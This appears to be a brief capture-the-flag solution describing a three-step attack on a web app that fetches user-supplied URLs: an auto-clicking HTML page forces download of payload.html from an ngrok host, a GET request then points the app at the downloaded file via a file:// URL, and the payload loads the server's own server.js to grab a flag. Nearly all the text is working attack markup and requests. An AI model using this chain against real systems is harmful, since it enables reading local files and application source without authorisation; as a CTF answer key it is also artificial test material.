# First request get download.html with the following contents

```html
<a href="http://2717e4a146b8.ngrok.io/payload.html" download id="x"></a>
<script>
x.click();
</script>
```

# Second request to get downloaded file

```http
GET /?url=file:///home/user/Downloads/payload.html
```

# payload.html

```html
<script>
  // some script to stop errors and grab the flag var
</script>
<script src="/home/user/app/server.js"></script>
```